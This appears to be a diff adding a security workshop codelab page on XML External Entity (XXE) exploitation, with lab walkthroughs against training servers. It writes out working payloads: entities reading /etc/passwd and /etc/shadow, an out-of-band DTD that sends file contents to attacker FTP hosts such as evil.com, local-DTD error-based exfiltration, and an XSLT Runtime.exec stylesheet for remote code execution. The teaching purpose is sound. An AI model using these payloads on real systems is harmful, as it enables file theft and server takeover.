@@ -1,0 +1,493 @@
+
+<!doctype html>
+
+<html>
+<head>
+  <meta name="viewport" content="width=device-width, minimum-scale=1.0, initial-scale=1.0, user-scalable=yes">
+  <meta name="theme-color" content="#4F7DC9">
+  <meta charset="UTF-8">
+  <title>Advanced XXE Exploitation</title>
+  <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+  <link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+  <link rel="stylesheet" href="https://storage.googleapis.com/codelab-elements/codelab-elements.css">
+  <style>
+    .success {
+      color: #1e8e3e;
+    }
+    .error {
+      color: red;
+    }
+  </style>
+</head>
+<body>
+  <google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+  <google-codelab codelab-gaid=""
+                  id="xxe-workshop"
+                  title="Advanced XXE Exploitation"
+                  environment="web"
+                  feedback-link="">
+    
+      <google-codelab-step label="Introduction" duration="5">
+        <p>Welcome to this 3-hour workshop on XML External Entities (XXE) exploitation!</p>
+<p>In this workshop, the latest XML eXternal Entities (XXE) and XML related attack vectors will be presented. XXE is a vulnerability that affects any XML parser that evaluates external entities. It is gaining more visibility with its introduction to the <a href="https://owasp.org/www-project-top-ten/2017/A4_2017-XML_External_Entities_(XXE).html" target="_blank">OWASP Top10 2017 (A4)</a>. You might be able to detect the classic patterns, but can you convert the vulnerability into directory file listing, binary file exfiltration, file write or remote code execution?</p>
+<p>The focus of this workshop will be presenting various techniques and exploitation tricks for both PHP and Java applications. Four applications will be at your disposition to test your skills. For every exercise, sample payloads will be given so that the attendees save some time.</p>
+<p>Agenda:</p>
+<ul>
+<li>Basic XXE patterns</li>
+<li>Out-of-bound DTD</li>
+<li>Filter encoding (PHP)</li>
+<li>Local DTD</li>
+<li>Jar protocol and XSLT RCE (Java)</li>
+</ul>
+<aside class="special"><p>For each exercise, detail steps will be given to reproduce the successful attack. Skeleton payloads are also provided on the code repository. In many exercises, a bonus challenge is given.</p>
+</aside>
+<aside class="special"><p>Exercises are independent. Feel free to do them in the order that you prefer.</p>
+</aside>
+<h2 is-upgraded>Requirements</h2>
+<p>The requirement is to have a to have an HTTP interception proxy installed.</p>
+<ul>
+<li><a href="https://portswigger.net/burp" target="_blank">Burp Suite</a></li>
+<li><a href="https://portswigger.net/burp" target="_blank">OWASP ZAP</a></li>
+</ul>
+<p>For the infrastructure, you will need:</p>
+<ul>
+<li><a href="https://www.docker.com/products/docker-desktop" target="_blank">Docker</a></li>
+<li><a href="https://www.oracle.com/java/technologies/javase-jdk11-downloads.html" target="_blank">Java 8+</a></li>
+<li><a href="https://maven.apache.org/" target="_blank">Maven</a> (<code>apt install maven</code>)</li>
+</ul>
+<aside class="warning"><p>If you only have a web browser, you won&#39;t be able to reproduce the steps provided. You can still follow the workshop by reading the content and watching the demonstrations.</p>
+</aside>
+<h2 is-upgraded>Deploying Test Applications</h2>
+<p>In order to do the exercise, you will need to run the <a href="https://github.com/GoSecure/xxe-workshop" target="_blank">lab applications</a> by yourself. All applications were built with a docker container recipe. This should make the deployment easier.</p>
+<ol type="1">
+<li>Download the code.<pre><code>$ git clone https://github.com/GoSecure/xxe-workshop
+</code></pre>
+</li>
+<li>Read build instructions (<code>%application_dir%/README.md</code>) This step will differ for each application.</li>
+<li>Use docker-compose to start the application.<pre><code>$ docker-compose up
+</code></pre>
+</li>
+</ol>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="XML External Entities" duration="5">
+        <h2 is-upgraded>XML is everywhere</h2>
+<p class="image-container"><img alt="XML format examples" src="img\a21547d0f19dd4f6.png"></p>
+<p>XML documents are used in plenty of file formats. You have probably already edited a configuration file written in XML. If you have built a website, you will edit or see inevitably HTML. You can also think about MS Office documents (<code>.docx</code>), Scalable Vector Graphic (<code>.svg</code>) and SOAP requests. Being widely implemented in most programming language, it is a excellent choice for interoperability. The <a href="https://www.w3.org/TR/xml/" target="_blank">XML standard</a> describes many useful formatting features but we are going to focus on &#34;<a href="https://www.w3.org/TR/xml/#sec-entity-decl" target="_blank">entities</a>&#34; because of the potential vulnerability it introduces.</p>
+<h2 is-upgraded>What are XML entities?</h2>
+<p>XML entities are reference to XML data inside of XML documents. We are mentioning XML data because it can be a literal string, XML tags or any legal XML syntax where it is inserted.</p>
+<p><strong>Entity in HTML are used for special characeters</strong></p>
+<p class="image-container"><img alt="Entity 1" src="img\3fd0637556ef955d.png"></p>
+<p><strong>Entity is being used for a repeated pattern</strong></p>
+<p class="image-container"><img alt="Entity 2" src="img\e55c3dbfaa9446fb.png"></p>
+<h3 is-upgraded>SYSTEM or External entities</h3>
+<p class="image-container"><img alt="Malicious XXE payload" src="img\623e88b9e2ba797a.png"></p>
+<p>When the keyword SYSTEM is added to an entity, it will attempt to load content from the specified URL. The value between quote is the URL. For XML parsing done in a small script execute locally, this seems like a nice feature. However, when the parsing is done server side, the URLs from SYSTEM entities are resolved also on the server. A malicious user could point to a file hosted on the remote server. If the server return the parsing result, the user will suddenly reveal the content of this file.</p>
+<pre><code>&lt;!DOCTYPE data [
+&lt;!ENTITY xxe SYSTEM &#34;file:///etc/passwd&#34;&gt;
+]&gt;
+&lt;data&gt;&amp;xxe;&lt;/data&gt;
+</code></pre>
+<p>If the application return the value inside the data node, the content of the file <code>/etc/passwd</code> will be reveal.</p>
+<h2 is-upgraded>Interesting files to read</h2>
+<p>Passwd is a file that is universally present on Linux operating system.</p>
+<ul>
+<li><code>file:///etc/passwd</code></li>
+<li><code>file:///etc/shadow</code> (Feeling lucky)</li>
+</ul>
+<p>Hostnames, DNS resolvers and network devices information can give precious information to discover additional assets.</p>
+<ul>
+<li><code>file:///etc/hosts</code></li>
+<li><code>file:///etc/resolv.conf</code></li>
+<li><code>file:///proc/self/net/dev</code> : Include public and internal IP</li>
+</ul>
+<p>The <code>/proc</code> virtual filesystem include various files describing the current process.</p>
+<ul>
+<li><code>file:///proc/self/cwd/FILE</code> : Relative paths are likely to work. <code>file:///proc/self/cwd/</code> is an alternative to <code>./</code>.</li>
+<li><code>file:///proc/self/cmdline</code> : This virtual file is returning the command and the arguments used to start the process.</li>
+<li><code>file:///proc/self/environ</code> : Environment defined for the context of the current process.</li>
+</ul>
+<p>There are few files that are containing the system version. These are also file with no special characters (Useful for testing).</p>
+<ul>
+<li><code>file:///proc/version</code></li>
+<li><code>file:///etc/lsb-release</code></li>
+<li><code>file:///etc/issue</code></li>
+</ul>
+<p>For testing purpose, it might be interesting to read virtual file with infinite content. The objective for the attacker would be to either do time based detection or create some sort of Denial of Service (DOS).</p>
+<ul>
+<li><code>file:///dev/urandom</code> &amp; <code>file:///dev/zero</code></li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 1: Basic XXE" duration="10">
+        <p>For this first exercise, we are using a website that render Atom feed. The service is at the URL : <a href="http://xxe-workshop.gosec.co:8021" target="_blank">http://xxe-workshop.gosec.co:8021</a></p>
+<p class="image-container"><img alt="Preview website" src="img\80181aebe1861b6.png"></p>
+<h2 is-upgraded>Solution</h2>
+<p>By submitting the form with the news feed (Atom feed) from the sub-reddit netsec.</p>
+<p class="image-container"><img alt="Preview website" src="img\697b56e06f6fbedc.png"></p>
+<p>At this point, we can assume that the server is parsing this XML source because we are only seeing one HTTP request in our proxy. The URL could have been fetch from the browser in Javascript but it is not the case here.</p>
+<h3 is-upgraded>Serving Your XML Files</h3>
+<p>For the workshop, you can use your shell to serve HTTP requests. As you can see below, you can start your simple web server with the command : <code>python -m http.server 8123</code>.</p>
+<aside class="warning"><p>Use a port that is unique. The port chosen may collide with the one from another participant.</p>
+</aside>
+<p class="image-container"><img alt="Preview website" src="img\853b9106c2b36b75.png"></p>
+<h3 is-upgraded>Sending a Basic Payload</h3>
+<p>It is always best to start with a simple working XML file rather than submit first with a complex and specific payload. Sometime failure to load our XML can be cause by simple syntax issue. XML can be unforgiving regarding the order of XML syntax, mistyped elements and unsupported characters.</p>
+<p class="image-container"><img alt="Preview website" src="img\23a632b494c83aeb.png"></p>
+<p>Once the file is saved, you can submit an URL to this file. The URL must be public.</p>
+<p class="image-container"><img alt="Preview website" src="img\ea201ef25a9f6fe.png"></p>
+<p>The result page should look like the following. It is a confirmation that our base file is valid. An XML file with a format other than Atom will trigger an error.</p>
+<p class="image-container"><img alt="Preview website" src="img\11d30615b3d8e2d.png"></p>
+<h3 is-upgraded>Confirming that XML entities are enabled</h3>
+<p>Next, we will attempt to fetch a file on the file system with an XML Entities. The Atom should look as follows.</p>
+<p class="image-container"><img alt="Preview website" src="img\e7a5ebb0807f0d80.png"></p>
+<p>As a result, we can see the content of the file <code>/etc/passwd</code> in the response.</p>
+<p class="image-container"><img alt="Preview website" src="img\9d2d062f7297c1be.png"></p>
+<p>In the source, we can see more easily the content of the file with new lines.</p>
+<p class="image-container"><img alt="Preview website" src="img\a9ec310493de701b.png"></p>
+<aside class="special"><p>To complete this exercise, load the file  <code>/secret/flag.txt</code>.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Ex-filtration with remote DTD" duration="5">
+        <h2 is-upgraded>Out-of-band Exfiltration</h2>
+<p>XML parsing remotely will not always return content directly. If you are uploading a document such as a data file (<code>.xml</code>) or an MS Office document (<code>.docx</code>), you might not received the content parse from those documents.</p>
+<p>We need to find a way exfiltrate data <strong>during</strong> the parsing. Unfortunately, it is possible refer to an entity from another entity <em>in the same DOCTYPE</em>. This limitation comes from the way XML parsers interpret.</p>
+<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!DOCTYPE data [ 
+ &lt;!ENTITY file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+ &lt;!ENTITY notworking SYSTEM &#34;http://xxe.me/&amp;file;&#34;&gt;
+]&gt;
+&lt;data&gt;&lt;/data&gt;
+</code></pre>
+<p><em>This payload will not work</em></p>
+<p>A workaround for this limitation was discovered by the researchers <a href="https://www.youtube.com/watch?v=eBm0YhBrT_c#t=11m51" target="_blank">Alexey Osipov and Timur Yunusov</a> that allow the construction of URL with data coming from other entities. The first version of this payload uses the Gopher protocol.</p>
+<p class="image-container"><img alt="XXE Gopher exfiltration" src="img\8c50403762b61e8e.gif"></p>
+<aside class="warning"><p>In practice, the previous technique is not perfect. Any file with XML incompatible characters (<code>&amp;</code>, <code>\n</code>, <code>\x80</code>, etc) would break the URL. The /etc/issue is one of the rare file safe to include.</p>
+</aside>
+<p>The previous technique was <a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank">updated with a variant</a>. This variant replaces Gopher with the FTP protocol. It is very useful because the Gopher is deprecated and only available on <a href="https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0" target="_blank">old version of Java</a>.</p>
+<p>The following payload requires a remote DTD file to be hosted on a web server. The DTD file is taking care of doing the concatenation. The final objective is to evaluate <code>ftp://test:%file;@my.ftp.server/</code>. The file content is sent as a password.</p>
+<p><strong>payload sent</strong></p>
+<pre><code>&lt;?xml version=&#34;1.0&#34;?&gt;
+&lt;!DOCTYPE data [ 
+ &lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+ &lt;!ENTITY % dtd SYSTEM &#34;http://your.host/remote.dtd&#34;&gt; 
+%dtd;]&gt;
+&lt;data&gt;&amp;send;&lt;/data&gt;
+</code></pre>
+<p><strong>http://your.host/remote.dtd</strong></p>
+<pre><code>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;!ENTITY % all &#34;&lt;!ENTITY send SYSTEM &#39;ftp://test:%file;@my.ftp.server/&#39;&gt;&#34;&gt; %all;
+</code></pre>
+<p>In order to capture the file content, you need to record the password sent to your FTP server. To serve this purpose, Ivan Novikov has created <a href="http://lab.onsec.ru/2014/06/xxe-oob-exploitation-at-java-17.html" target="_blank">a mock FTP server</a> that respond just enough to record password. (FTP client will not authenticate if the handshake is incomplete.)</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 2: Exfiltration with remote DTD" duration="15">
+        <p>For this second exercise, we are using a website that render SVG image based on the XML given. The service is at the URL : <a href="http://xxe-workshop.gosec.co:8022" target="_blank">http://xxe-workshop.gosec.co:8022</a></p>
+<p class="image-container"><img alt="Preview website" src="img\3457b453fd3f53ed.png"></p>
+<h2 is-upgraded>Solution</h2>
+<h3 is-upgraded>First exploration</h3>
+<p>When reusing the technique we saw in the previous exercise, we can see that the file content is displaying all in one line. This makes it hard to exfiltrate text files. In many real-world cases, the result will simply not display to the user. The parsing will be done and hidden, or done asynchronously.</p>
+<p class="image-container"><img alt="Simple XXE test in SVG parser" src="img\21e2152e74c81015.png"></p>
+<h3 is-upgraded>Out-of-bound with the FTP protocol</h3>
+<p>Now, we are going to attempt to exfiltrate the file with the out-of-bound DTD technique. The XML payload will look as follows:</p>
+<p class="image-container"><img alt="XML payload XXE out-of-bound" src="img\3e063b58465a34c1.png"></p>
+<p>The DTD reference in the XML payload is a file that we control. The DTD serve the purpose of concatenation the file content inside a FTP URL.</p>
+<p class="image-container"><img alt="XXE DTD with FTP URL" src="img\8c9309eca0198927.png"></p>
+<p>Instead of using a real FTP server. We will use a dummy one that responds to few FTP command and will display all content received including the password. We are expecting to receive the file content in the password.</p>
+<p class="image-container"><img alt="XXE Dummy FTP" src="img\923bc8cb0adb2f65.png"></p>
+<h3 is-upgraded>Sending the XML payload</h3>
+<p>The payload should look like this.</p>
+<p class="image-container"><img alt="XXE Request URL escaped in Burp" src="img\90affef6e5f10a5c.png"></p>
+<p>One easier way to use the encoding tags from the HackVertor plugin. It is a good encoding tool for quickly testing payload without re-encoding the payload on every request.</p>
+<p class="image-container"><img alt="XXE Request with Burp HackVertor" src="img\10a3c9a379a4a552.png"></p>
+<h3 is-upgraded>Payload execution</h3>
+<p>Every step of the XML parsing is susceptible to failed due to small error. If you get result different than the screenshot investigate the potential causes.</p>
+<p>First, the DTD is fetch. This confirm that our XML payload is well-formed. If it is not the case, verify the URL you specified in the XML entity.</p>
+<p class="image-container"><img alt="XXE HTTP Request Received" src="img\928acdd320535381.png"></p>
+<p>Second, the FTP is contacted. Confirming that the concatenation succeed.</p>
+<p class="image-container"><img alt="XXE FTP Request Received" src="img\631fa2d8002ab2fd.png"></p>
+<h3 is-upgraded>Exploring the file system</h3>
+<p>You can continue exploring the file system by modifying your XML payload and seeing the result on your shell in the dummy FTP server output.</p>
+<p class="image-container"><img alt="XXE Exploring file system" src="img\7041341eddf9a0e7.png"></p>
+<aside class="special"><p>To complete this exercise, load the file <code>flag.txt</code> hidden on the server.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Filter encoding" duration="5">
+        <h2 is-upgraded>Introduction</h2>
+<p>We already mentioned the <code>php://</code> protocol. This protocol available - of course - only on PHP is providing few options to encode or decode file content.</p>
+<p>XXE have major limitations regarding which file can be read. In general, you can&#39;t read non-ascii characters or special characters that are not XML compatible. You might have notice when doing the first two exercices.</p>
+<h2 is-upgraded>Encoding file content</h2>
+<p>In order to read file with special characters, we can take advantage of the php protocol</p>
+<p><code>php://filter/convert.base64-encode/resource=/source_code.zip</code></p>
+<p>Reference: <a href="https://www.php.net/manual/en/wrappers.php.php" target="_blank">php:// - php.net documentation</a></p>
+<h2 is-upgraded>Other interesting protocols</h2>
+<p>Here is an exhaustive list of protocols that could be useful when exploiting an XXE.</p>
+<h3 is-upgraded>file: protocol</h3>
+<p>Access file with relative or absolute path</p>
+<p>Examples:</p>
+<ul>
+<li><code>file:///etc/passwd</code></li>
+<li><code>file://C:/Windows/System32/inetsrv/config/applicationHost.config</code></li>
+</ul>
+<h3 is-upgraded>http: protocol</h3>
+<p>Nothing suprising here. You can trigger GET request to HTTP service. While it can be a starting point for Server Side Request Forgery (SSRF), the response is not likely to be readable. Most webpages are not perfectly XML valid.</p>
+<p>Example:</p>
+<ul>
+<li><code>https://192.168.0.150:8000/</code></li>
+<li><code>https://localhost/phpMyAdmin/</code></li>
+</ul>
+<p>:negative<br><code>https://169.254.169.254/latest/user-data</code> AWS metadta URLs now require a special header. It is unlikely that you will be able to access it with an XXE.</p>
+<h3 is-upgraded>ftp: protocol</h3>
+<p>This protocol allows you to connect to a FTP server to read file (would require to know the exact file location and credentials to authenticate) or exfiltrate data (see the next exercise).</p>
+<p>Example:</p>
+<ul>
+<li><code>ftp://user:password@internal.company.net/file</code></li>
+<li><code>ftp://user:&lt;data_exfil&gt;@evil.com</code></li>
+</ul>
+<h3 is-upgraded>gopher: protocol</h3>
+<p>Another option for data exfiltration is the gopher protocol. It allows to connect to any server with a TCP with an arbitrary message. The path section of the URL is the data that will be written to the TCP socket.<br>It is rarely available as it require very <a href="https://bugzilla.redhat.com/show_bug.cgi?id=865541#c0" target="_blank">old versions of Java</a>.</p>
+<ul>
+<li><code>gopher://server/?data</code></li>
+</ul>
+<h3 is-upgraded>jar: protocol</h3>
+<p>The <code>jar</code> protocol is a very special case. It is only available on Java applications. It allows to access files inside a PKZIP archive (<code>.zip</code>, <code>.jar</code>, ...). You will see in the last exercise how it can be used to write file to a remote server.</p>
+<p>Example:</p>
+<ul>
+<li><code>jar:file://./archive.zip!config.properties</code></li>
+</ul>
+<h3 is-upgraded>netdoc: protocol</h3>
+<p>This protocol is alternative to the <code>file://</code> protocol. It is of limited use. It is often cited as a method to bypass some WAF blocking for specific string such as <code>file:///etc/passwd</code>.</p>
+<p>Example:</p>
+<ul>
+<li><code>netdoc:///etc/passwd</code></li>
+</ul>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 3: Filter encoding" duration="15">
+        <p>For this third exercise, we are using a website that is very similar to the first exercise. It is also parsing Atom feed. It is however using a different language : PHP. The service is at the URL : <a href="http://xxe-workshop.gosec.co:8022" target="_blank">http://xxe-workshop.gosec.co:8022</a></p>
+<p class="image-container"><img alt="Preview website" src="img\500c3bc4c8f102b8.png"></p>
+<h2 is-upgraded>Solution</h2>
+<h3 is-upgraded>Using a PHP filter</h3>
+<p>Similarly to the first exercise, we are going to host a malicious Atom feed on a web server. This XML document will use PHP base64-encoding filter inside an XML entitiy.</p>
+<p class="image-container"><img alt="XXE PHP filter payload" src="img\feb8e65d34116258.png"></p>
+<p>The response will be in Base64 because, this is what we instruct the server to do with the filter. To read the original content, we can decode it with a variety of decoding tools. In Burp, you can press <strong>Ctrl-B</strong> to decode your selection.</p>
+<p class="image-container"><img alt="XXE Decoding the Base64 response in Burp" src="img\ef32aaa48aea4f92.png"></p>
+<aside class="special"><p>To read the <code>.svn/wc.db</code>, you have two options. You can either loaded it with a sqlite client or simply look at it in a text editor. The first option would scale better with large repository history.</p>
+</aside>
+<h3 is-upgraded>Hidden page</h3>
+<p>The SVN metadata file revealed us that a PHP script was present at <code>/test_dev.php</code>.</p>
+<p class="image-container"><img alt="Hidden page found" src="img\18a5e0dc98559fcd.png"></p>
+<p>We can use the same filter technique to view the source code of this page. Here is the payload.</p>
+<p class="image-container"><img alt="Viewing PHP source" src="img\95d37e8525c23a76.png"></p>
+<p>When the response is received, we can decode the base 64 blob to view the PHP source.</p>
+<p class="image-container"><img alt="Decoding the Base64 response in Burp" src="img\635a5fd453383b2e.png"></p>
+<aside class="special"><p><strong>Can you spot the vulnerability?<br></strong> You can now review the source of the developper script. You should be able to find an additionnal vulnerability (unrelated to XXE) that will give you remote code execution.</p>
+</aside>
+<aside class="special"><p>To complete this exercise, load the file <code>flag.txt</code> hidden on the server.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Jar protocol" duration="5">
+        <h2 is-upgraded>jar: purpose</h2>
+<p>The <code>jar</code> protocol is only available on Java applications. It allows to access file inside a PKZIP file (<code>.zip</code>, <code>.jar</code>, ...).</p>
+<p>It works for local file..</p>
+<pre><code>jar:file:///var/myarchive.zip!/file.txt
+</code></pre>
+<p>And with remote file..</p>
+<pre><code>jar:https://download.host.com/myarchive.zip!/file.txt
+</code></pre>
+<h2 is-upgraded>Behind the scene</h2>
+<p>What is happening behind the scene with the HTTP URL with a remote ZIP? There are in fact multiple steps that lead to the file being extracted.</p>
+<ol type="1">
+<li>It does an HTTP request to load the zip archive. <code>https://download.host.com/myarchive.zip</code></li>
+<li>It save the HTTP response to a temporary location. <code>/tmp/...</code></li>
+<li>It extract of the archive.</li>
+<li>It reads the <code>file.zip</code></li>
+<li>It delete the temporary files.</li>
+</ol>
+<p>What if we manage to stop the sequence at the second step?.. It is possible to do so!</p>
+<h2 is-upgraded>Complement: XSLT</h2>
+<aside class="special"><p>This segment is required for the next exercise. This vector is not consider an XXE as it focus on a different feature of XML.</p>
+</aside>
+<p>Extensible Stylesheet Language Transformations (or XSLT) is a text format that describe the transformation applied to XML documents. The official specification provide basic transformation. Language such as Java and .NET have introduce extension to allow invocation of method from the stylesheet. The Java implementation is more prone to vulnerability being enable by default. It has the capability to access all class in the classpath.</p>
+<p>If you are seeing a feature that allow you to configure an XSLT file in a Java application, it is likely to trigger remote code execution.</p>
+<pre><code>&lt;xsl:stylesheet version=&#34;1.0&#34;
+xmlns:xsl=&#34;http://www.w3.org/1999/XSL/Transform&#34;
+xmlns:date=&#34;http://xml.apache.org/xalan/java/java.util.Date&#34;
+xmlns:rt=&#34;http://xml.apache.org/xalan/java/java.lang.Runtime&#34;
+xmlns:str=&#34;http://xml.apache.org/xalan/java/java.lang.String&#34;
+exclude-result-prefixes=&#34;date&#34;&gt;
+    &lt;xsl:output method=&#34;text&#34;/&gt;
+    &lt;xsl:template match=&#34;/&#34;&gt;
+    &lt;xsl:variable name=&#34;cmd&#34;&gt;&lt;![CDATA[touch /tmp/test1234]]&gt;&lt;/xsl:variable&gt;
+    &lt;xsl:variable name=&#34;rtObj&#34; select=&#34;rt:getRuntime()&#34;/&gt;
+    &lt;xsl:variable name=&#34;process&#34; select=&#34;rt:exec($rtObj, $cmd)&#34;/&gt;
+    &lt;xsl:text&gt;Process: &lt;/xsl:text&gt;&lt;xsl:value-of select=&#34;$process&#34;/&gt;
+    &lt;/xsl:template&gt;
+&lt;/xsl:stylesheet&gt;
+</code></pre>
+<p>In the root node, classes (<code>java.lang.Runtime</code> and <code>java/java.lang.String</code>) are imported for future reference. To customize the previous payload, you need to edit the assignment <code>&lt;xsl:variable name=&#34;cmd&#34;&gt;&lt;![CDATA[touch /tmp/test1234]]&gt;&lt;/xsl:variable&gt;</code>. The touch command can be replace with any command available on the server.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 4: Jar protocol" duration="15">
+        <p class="image-container"><img alt="Preview website" src="img\a4d05bc0aa6f7f94.png"></p>
+<h2 is-upgraded>Solution</h2>
+<h3 is-upgraded>Generating a script</h3>
+<p>To exploit this service, we will need to evaluate multiple URLs with the same XXE base payload. To send those similar request, we can encapsule the logic inside a script.</p>
+<p>Here is demonstration of the Burp plugin <a href="https://portswigger.net/bappstore/6e0b53d8c801471c9dc614a016d8a20d" target="_blank">Reissue Request Scripter</a>. The request exported is the POST request to <code>/admin/upload</code>.</p>
+<aside class="warning"><p>Make sure to submit the form in order to see the request in your Burp history.</p>
+</aside>
+<p class="image-container"><img alt="Generating script in Burp" src="img\48de24aaef846d03.png"></p>
+<p class="image-container"><img alt="Generated script in Burp" src="img\676502cfb075c68e.png"></p>
+<h3 is-upgraded>Configuring the exploit script</h3>
+<p>For this exercise, an exploit script is provided to you. The only segment to edit is the session cookie.</p>
+<p class="image-container"><img alt="Editing generated script" src="img\4e0f8c6e1947f40.png"></p>
+<p>You can test that the script is working properly by evaluating a test file. The script has only one argument the file to evaluate (<code>python exploit.py [FILE]</code>). In the capture below, we are executing <code>python exploit.py /etc/issue</code>.</p>
+<p class="image-container"><img alt="Launching XXE script" src="img\e1ba7c3de7e774fd.png"></p>
+<h3 is-upgraded>Exploiting with the jar protocol</h3>
+<p>In order to persist a file more than a second, we must serve the file with a web server that will hold connection as long as possible. A simple Tornado server is provided in the workshop repository. You can see in the script that a call to the <code>sleep</code> function is done to prevent the closed connection when the function return. As soon as the connection would closed, the Java application would attempt to extract the ZIP and dispose the file leaving us no time to use the file writen to disk.</p>
+<p class="image-container"><img alt="Slow HTTP server script" src="img\6a4787cc6054b16c.png"></p>
+<p>The file that will be served is malicious stylesheet. For more information, refer to the previous section.</p>
+<p>In the following stylesheet, we are invoking the methods <code>Runtime.getRuntime().exec(&#34;/bin/busybox ....&#34;)</code>.</p>
+<p class="image-container"><img alt="XSLT payload" src="img\1f193ee88f2d3b0f.png"></p>
+<h3 is-upgraded>Putting the pieces togetter</h3>
+<p><strong>Step 1: The &#34;slow&#34; HTTP server</strong></p>
+<p class="image-container"><img alt="Slow HTTP server" src="img\ec9193e94a053451.png"></p>
+<p><strong>Step 2: Uploading our file</strong></p>
+<p class="image-container"><img alt="Slow HTTP server" src="img\6ef519872a9cc64a.png"></p>
+<p><strong>Step 3: Browsing to find the full path of the file</strong></p>
+<p class="image-container"><img alt="Slow HTTP server" src="img\60b4dcc183784809.png"></p>
+<p><strong>Step 4: Exploit path traversal</strong></p>
+<p class="image-container"><img alt="Path traversal Burp" src="img\329c5cdeba5ce6d9.png"></p>
+<p><strong>Step 5: Interact with shell</strong></p>
+<p class="image-container"><img alt="NC Shell" src="img\5d2b5e66a494da3.png"></p>
+<aside class="warning"><p>Make sure that your file was written to disk before attempting the path traversal.</p>
+</aside>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="Exfiltration with local DTD" duration="5">
+        <h2 is-upgraded>The problem</h2>
+<p>If the <strong>XML parsed is not returned</strong> and <strong>the network side-channel are not possible</strong> (aggressive network filter), would the XML parser be vulnerable in this case? This case was for a few years consider unexploitable.</p>
+<h2 is-upgraded>Error-based exfiltration</h2>
+<p class="image-container"><img alt="Filename exception" src="img\de3c2c4c7d3a3a63.png"></p>
+<p>One of the remaining channel is the error messages. This channel is available if the application is configured to returned detail error messages.</p>
+<h2 is-upgraded>Method without external DTD</h2>
+<p>Can we do a concatenation trick without external DTD ? The short answer to the problem is: Yes we can!<br>Arseniy Sharoglazov found <a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/" target="_blank">an interesting technique that allows us to use an local DTD instead of an external DTD</a>.</p>
+<p>We need to find an entity that is declared and use in the same DTD. Here is an example taken from <code>/usr/share/xml/fontconfig/fonts.dtd</code>.</p>
+<pre><code>[...]
+&lt;!ENTITY % constant &#39;&gt;[MALICIOUS]&lt;!ELEMENT dummy(123 &#39;&gt;
+&lt;!ELEMENT patelt (%constant;)*&gt;
+[...]
+</code></pre>
+<p>If we replace the <code>constant</code> entity by the following XML injection. It would allows us to evaluate arbirary XML. Our objective is going to do a concatenation within this injection point.</p>
+<pre><code>&lt;!ENTITY % constant &#39;&gt;[MALICIOUS]&lt;!ELEMENT dummy(123 &#39;&gt;
+
+&lt;!ELEMENT patelt (%constant;)*&gt;
+</code></pre>
+<p>The malicious XML we are looking to inject in the <code>[MALICIOUS]</code> placeholder is the following:</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &#34;file:///etc/passwd&#34;&gt;
+&lt;!ENTITY % eval &#34;&lt;!ENTITY &amp;#x25; error SYSTEM &#39;file:///nonexistent/%file;&#39;&gt;&#34;&gt;
+</code></pre>
+<p>When <code>%eval</code> will be evaluated the concatenation will occurs.</p>
+<h2 is-upgraded>Overview</h2>
+<p>In summary, here are the steps that will be needed during the XML parsing:</p>
+<ol type="1">
+<li>Initialize local DTD</li>
+<li>Overrides one of its entity (replace the entity)</li>
+<li>Evaluate ELEMENT and ENTITY from the local DTD</li>
+</ol>
+<p>The final evaluation should trigger the injection of new entities doing<br>the same concatenation trick used in external DTD.</p>
+<h2 is-upgraded>Final payload</h2>
+<p>The payload we are going to send will look like this:</p>
+<pre><code>&lt;!DOCTYPE message [
+    &lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/xml/fontconfig/fonts.dtd&#34;&gt;
+
+&lt;!ENTITY % constant &#39;&gt;&lt;!ENTITY &amp;#x25; file SYSTEM
+&#34;file:///etc/passwd&#34;&gt; &lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY
+&amp;#x26;#x25; error SYSTEM
+&amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&#34;&gt;&lt;!ELEMENT
+dummy(123 &#39;&gt;
+&lt;!ELEMENT patelt (%constant;)*&gt;
+
+
+    %local_dtd;
+]&gt;
+&lt;message&gt;&lt;/message&gt;
+</code></pre>
+<p>To see it in action, pass to the next section.</p>
+<p>If you want to know more about the different injection patterns, visit this blog post: <a href="https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation/" target="_blank">Automating local DTD discovery for XXE exploitation<br></a>.</p>
+
+
+      </google-codelab-step>
+    
+      <google-codelab-step label="LAB 5: Exfiltration with local DTD" duration="15">
+        <p class="image-container"><img alt="Preview website" src="img\3457b453fd3f53ed.png"></p>
+<h2 is-upgraded>Solution</h2>
+<h3 is-upgraded>Triggering a FileNotFoundException</h3>
+<p>At first, we need to build a base payload that simply trigger a <code>FileNotFoundException</code>. We need to confirm that error message are returned to the client.</p>
+<p class="image-container"><img alt="Burp request file not found" src="img\4ff86de05692ed22.png"></p>
+<h3 is-upgraded>Using Intruder to Brute Force DTD</h3>
+<p>In order to find if at least one interesting DTD is present on the remote server, we are going to need to brute-force it with a <a href="https://raw.githubusercontent.com/GoSecure/dtd-finder/master/list/dtd_files.txt" target="_blank">huge list of potential paths</a>.</p>
+<p class="image-container"><img alt="Request to intruder" src="img\20a917ef67b8d682.png"></p>
+<p>The content that will change in our request is the path. The XML around this path will not change and it needs to be URL encoded.</p>
